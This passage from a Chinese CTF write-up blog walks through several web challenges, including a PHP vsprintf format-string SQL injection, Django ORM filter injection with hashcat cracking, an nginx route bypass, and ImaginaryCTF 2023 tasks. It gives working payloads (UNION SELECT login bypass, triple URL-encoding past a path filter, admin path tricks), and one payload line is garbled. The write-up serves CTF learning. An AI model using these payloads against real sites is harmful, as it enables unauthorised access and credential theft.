<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用了<code>vsprintf</code>函数，实际上在此处可以对$params进行注入，传入的是password，所以根据php的弱语言特性进行sql注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">sha1</span>(<span class="string">&quot;668&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span> . <span class="string">&quot;%c&quot;</span>. <span class="string">&#x27;&quot; AND password = &#x27;</span>,[<span class="variable">$password</span>]);</span><br></pre></td></tr></table></figure>
<p>实际上还可以定义顺序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">vsprintf</span>(<span class="string">&quot;Second character: %2\$c. First character: %1\$c&quot;</span>,[<span class="string">&quot;97&quot;</span>, <span class="string">&quot;98&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>利用%1,%2获取后面参数的数组位置</p>
<p>然后初步构造的payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin%ff%1$c#&amp;password=668</span><br></pre></td></tr></table></figure>
<p>实际上我们没办法直接传入一个调用两个说明符（不然就报错了），所以我们需要做一下处理</p>
<p>第三步:利用转义将其转成我们想要的(天才的想法)</p>
<ul>
<li><code>%1$'&gt;%</code> : takes the parameter at position 1, using the value <code>&gt;</code> as padding character (<code>'(char)</code> is an optional flag in <code>vsprintf</code> that can be use for padding). It basically returns the character <code>%</code> (which is a valid specifier)</li>
</ul>
<p>利用可选占位，让其返回正常的%说明符(&gt;表示占位符号，也就是右对齐的意思，但是本质上就是预留空间的意思)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">1</span>$<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">$&#x27;</span>&gt; <span class="comment">//本身不会作为说明符的作用，但是会让后面的填充失效，原因在于这个填充是可选的，不一定会有...</span></span><br><span class="line">&gt; <span class="comment">//转义之后得到&amp;gt;而&amp;g也是作为一种浮点数说明符存在，然后就成功绕过了数组大小引发的问题</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">sha1</span>(<span class="string">&quot;668&quot;</span>);</span><br><span class="line"><span class="variable">$username</span>= <span class="string">&quot;admin%1\$c#%1$&#x27;&gt;%2\$s&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$username</span> ,[<span class="variable">$password</span>,<span class="string">&#x27;aa&#x27;</span>]);</span><br><span class="line"><span class="comment">//admin&quot;#%2$s</span></span><br></pre></td></tr></table></figure>
<p>最后填充的状态</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">vsprintf</span>(<span class="string">&quot;Hello admin%1<span class="subst">$c</span>#%1$&#x27;&amp;gt;%2<span class="subst">$s</span>, the server time is %s&quot;</span>,[<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)])</span><br></pre></td></tr></table></figure>
<p>也就成功获取到了flag(最后还是弱语言的特性)</p>
<h3 id="secureblog">secureblog</h3>
<h4 id="Django-API开发"><strong>Django</strong> API开发</h4>
<p><a href="https://zhuanlan.zhihu.com/p/102269279">如何借助 Django 来编写一个 Python Web API - 知乎 (zhihu.com)</a></p>
<p>路由存在于<code>urls.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> re_path</span><br><span class="line"><span class="keyword">from</span> app.views <span class="keyword">import</span> ArticleView</span><br><span class="line"></span><br><span class="line"><span class="comment"># Had some weird issues when combined with NGINX reverse proxy earlier so using re_path instead of path</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    re_path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    re_path(<span class="string">&#x27;api/articles/&#x27;</span>, ArticleView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>只有两个路由，先看第二个路由，引用了<code>ArticleView.as_view()</code>，在Django框架中会根据请求的方式进行处理，交给后端处理之后，将其渲染到前端</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.request <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> Article</span><br><span class="line"><span class="keyword">from</span> app.serializers <span class="keyword">import</span> ArticleSerializer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArticleView</span>(<span class="title class_ inherited__">APIView</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        View for Articles</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, request: Request, <span class="built_in">format</span>=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Just return all articles</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        articles = Article.objects.<span class="built_in">all</span>()</span><br><span class="line">        serializer = ArticleSerializer(articles, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request: Request, <span class="built_in">format</span>=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Query articles</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        articles = Article.objects.<span class="built_in">filter</span>(**request.data)</span><br><span class="line">        serializer = ArticleSerializer(articles, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.data)</span><br></pre></td></tr></table></figure>
<p>如果使用的是post方法，会进行<code>Article.objects.filter(**request.data)</code>，查询数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Article</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Test Article model</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    title = models.CharField(max_length=<span class="number">255</span>)</span><br><span class="line">    body = models.TextField()</span><br><span class="line">    created_by = models.ForeignKey(User, on_delete=models.CASCADE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.title&#125;</span>-<span class="subst">&#123;self.created_by.username&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        ordering = [<span class="string">&quot;title&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>参数可控，可以进行sql查询</p>
<p><a href="https://www.runoob.com/django/django-orm-1.html">Django ORM – 单表实例 | 菜鸟教程 (runoob.com)</a></p>
<p><img src="/img/image-20230911223235921.png" alt="image-20230911223235921" /></p>
<p>根据官方文档的说明，可以使用下面的方法进行查询(直接进行属性注入)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Restaurant.objects.<span class="built_in">filter</span>(</span><br><span class="line"><span class="meta">... </span>    pizzas__vegetarian=<span class="literal">True</span>,</span><br><span class="line"><span class="meta">... </span>    pizzas__name__icontains=<span class="string">&quot;mozzarella&quot;</span>,</span><br><span class="line"><span class="meta">... </span>)</span><br></pre></td></tr></table></figure>
<p>直接使用函数化属性查询，再回来看一眼这个</p>
<p><img src="/img/image-20230911230134396.png" alt="image-20230911230134396" /></p>
<p>createf_by.username，那么就存在一个createf_by.password（查一下sql文件就知道了）</p>
<p>然后使用上面的查询方式，根据返回的结果不同进行sql注入</p>
<p><img src="/img/image-20230911231856202.png" alt="image-20230911231856202" /></p>
<p>然后根据提示使用hashcat开始爆破</p>
<p><code>hashcat -m 10000  hash rockyou.txt</code></p>
<p>然后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pbkdf2_sha256$1000$057C2I2qdGH98Hm2CSkiKZ$6Eq+K931+YFv4OV578LDDDyFoWEp2OClbcnRF1qxHjE=:shrekndonkey</span><br></pre></td></tr></table></figure>
<p>最后还有一个本地请求的绕过，在nginx配置中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/(api|admin) &#123;</span><br><span class="line">        # Make sure no one else can access /admin besides myself</span><br><span class="line">        location ~ ^/admin &#123;</span><br><span class="line">            allow 127.0.0.1;</span><br><span class="line">            deny all;</span><br><span class="line">        &#125;</span><br><span class="line">        proxy_pass http://127.0.0.1:8000;</span><br><span class="line">        proxy_set_header Host 127.0.0.1:8000;</span><br><span class="line">        proxy_set_header Origin http://127.0.0.1:8000;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>将会允许api或者admin开头的(admin开头的需要本地的请求)，对于以“/api”或“/admin”开头的URL，Nginx会将这些请求代理到在<code>http://127.0.0.1:8000</code>上运行的Django应用程序，但是在urls.py中将会匹配以admin结尾的</p>
<p>所以直接使用api开头，admin结尾的就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/apiadmin/login/?next=/apiadmin/</span><br><span class="line">http://127.0.0.1/apiadmin/app/flag/1/change/</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ImaginaryCTF</title>
    <url>/2023/08/16/13-36-40/</url>
    <content><![CDATA[<h1>2023ImaginaryCTF</h1>
<span id="more"></span>
<h1>Web</h1>
<h2 id="inspection">inspection</h2>
<p><img src="/img/image-20230723221756872.png" alt="image-20230723221756872" /></p>
<h2 id="Idoriot">Idoriot</h2>
<p><img src="/img/image-20230723221906823.png" alt="image-20230723221906823" /></p>
<p>注册时可以直接更改user_id</p>
<h2 id="idoriot-revenge">idoriot-revenge</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if user is logged in</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if session is expired</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() &gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;expires&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: logout.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display user ID on landing page</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome, User ID: &quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the user for admin</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:memory:&#x27;</span>);</span><br><span class="line"><span class="variable">$admin</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check user_id</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user_id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="comment">// Check if the user is admin</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user_id</span> == <span class="string">&quot;php&quot;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$admin</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// Read the flag from flag.txt</span></span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;<span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display the source code for this file</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>审计代码，需要满足</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user_id</span> == <span class="string">&quot;php&quot;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$admin</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>前者只是需要传入字符串或者0</p>
<p>后者通过正则判断用户名是否含有admin</p>
<p><img src="/img/image-20230723222300380.png" alt="image-20230723222300380" /></p>
<p>任意注册一个，修改id就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://idoriot-revenge.chal.imaginaryctf.org/index.php?user_id=0</span><br></pre></td></tr></table></figure>
<h2 id="roks">roks</h2>
<p>给了源码，重点关注file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="variable">$filename</span>, <span class="string">&quot;/&quot;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">str_contains</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$contentType</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="string">&quot;stopHacking.png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: <span class="subst">$contentType</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="string">&quot;stopHacking.png&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="string">&quot;images/&quot;</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$contentType</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: <span class="subst">$contentType</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$filePath</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先先url解码，如果出现<code>/</code>或者<code>.</code>就gg了，但是else会再一次解码</p>
<p>那就是三次编码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://roks.chal.imaginaryctf.org/file.php?filespan><br></pre></td></tr></table></figure>
<h2 id="Perfect-Picture"><strong>Perfect Picture</strong></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">uploaded_image</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.read()</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] + uploaded_image) <span class="keyword">as</span> image:</span><br><span class="line">        w, h = image.size</span><br><span class="line">        <span class="keyword">if</span> w != <span class="number">690</span> <span class="keyword">or</span> h != <span class="number">420</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> image.getpixel((<span class="number">412</span>, <span class="number">309</span>)) != (<span class="number">52</span>, <span class="number">146</span>, <span class="number">235</span>, <span class="number">123</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> image.getpixel((<span class="number">12</span>, <span class="number">209</span>)) != (<span class="number">42</span>, <span class="number">16</span>, <span class="number">125</span>, <span class="number">231</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> image.getpixel((<span class="number">264</span>, <span class="number">143</span>)) != (<span class="number">122</span>, <span class="number">136</span>, <span class="number">25</span>, <span class="number">213</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> exiftool.ExifToolHelper() <span class="keyword">as</span> et:</span><br><span class="line">        metadata = et.get_metadata(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] + uploaded_image)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> metadata[<span class="string">&quot;PNG:Description&quot;</span>] != <span class="string">&quot;jctf&#123;not_the_flag&#125;&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> metadata[<span class="string">&quot;PNG:Title&quot;</span>] != <span class="string">&quot;kool_pic&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> metadata[<span class="string">&quot;PNG:Author&quot;</span>] != <span class="string">&quot;anon&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
<p>只要上传的图片能过check就行</p>
<p>槽点：这种题应该放misc的</p>
<p>脚本一把梭，需要配置一下exiftool.exe到环境变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_flag_image</span>(<span class="params">filename</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, (<span class="number">690</span>, <span class="number">420</span>), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    draw.point((<span class="number">412</span>, <span class="number">309</span>), fill=(<span class="number">52</span>, <span class="number">146</span>, <span class="number">235</span>, <span class="number">123</span>))</span><br><span class="line">    draw.point((<span class="number">12</span>, <span class="number">209</span>), fill=(<span class="number">42</span>, <span class="number">16</span>, <span class="number">125</span>, <span class="number">231</span>))</span><br><span class="line">    draw.point((<span class="number">264</span>, <span class="number">143</span>), fill=(<span class="number">122</span>, <span class="number">136</span>, <span class="number">25</span>, <span class="number">213</span>))</span><br><span class="line">    img.save(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_image_metadata</span>(<span class="params">image_path</span>):</span><br><span class="line">    metadata = &#123;</span><br><span class="line">        <span class="string">&quot;PNG:Description&quot;</span>: <span class="string">&quot;jctf&#123;not_the_flag&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PNG:Title&quot;</span>: <span class="string">&quot;kool_pic&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PNG:Author&quot;</span>: <span class="string">&quot;anon&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    command = [<span class="string">&quot;exiftool&quot;</span>, <span class="string">&quot;-overwrite_original&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> tag, value <span class="keyword">in</span> metadata.items():</span><br><span class="line">        command.append(<span class="string">f&quot;-<span class="subst">&#123;tag&#125;</span>=<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">    command.append(image_path)</span><br><span class="line"></span><br><span class="line">    subprocess.run(command, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_image_metadata</span>(<span class="params">image_path</span>):</span><br><span class="line">    command = [<span class="string">&quot;exiftool&quot;</span>, image_path]</span><br><span class="line">    result = subprocess.run(command, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.returncode == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Metadata for image: &quot;</span>, image_path)</span><br><span class="line">        <span class="built_in">print</span>(result.stdout)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>, result.stderr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img_filename = <span class="string">&quot;flag.png&quot;</span></span><br><span class="line"></span><br><span class="line">created_filename = create_flag_image(img_filename)</span><br><span class="line">set_image_metadata(img_filename)</span><br><span class="line">view_image_metadata(img_filename)</span><br></pre></td></tr></table></figure>
<h2 id="blank">blank</h2>
<p>sqlite3的注入（但是没有完全注入）</p>
<p>只需要能够登录为admin就行</p>
<p>那么username设置为admin</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error retrieving user&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (row) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">true</span>;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Login successful!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid username or password&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>sql查询的时候没有判断password是否是admin的password，那么只需要不报错，sql查到东西就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=a&quot;union select 1,2,3/*&amp;username=admin  //post</span><br></pre></td></tr></table></figure>
<h2 id="login">login</h2>
<p>赛后的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;FLAG&#x27;</span>] ?? <span class="string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$magic</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;MAGIC&#x27;</span>] ?? <span class="string">&#x27;aabbccdd11223344&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/db.sqlite3&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$magic</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> .= <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">querySingle</span>(<span class="string">&quot;SELECT username, pwhash FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid username or password&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$res</span>[<span class="string">&#x27;pwhash&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$u</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Welcome <span class="subst">$u</span>! But there is no flag here :P&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$msg</span> .= <span class="string">&quot;&lt;!-- magic: <span class="subst">$magic</span> --&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid username or password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先第一步需要得到magic才能够使得password带上flag</p>
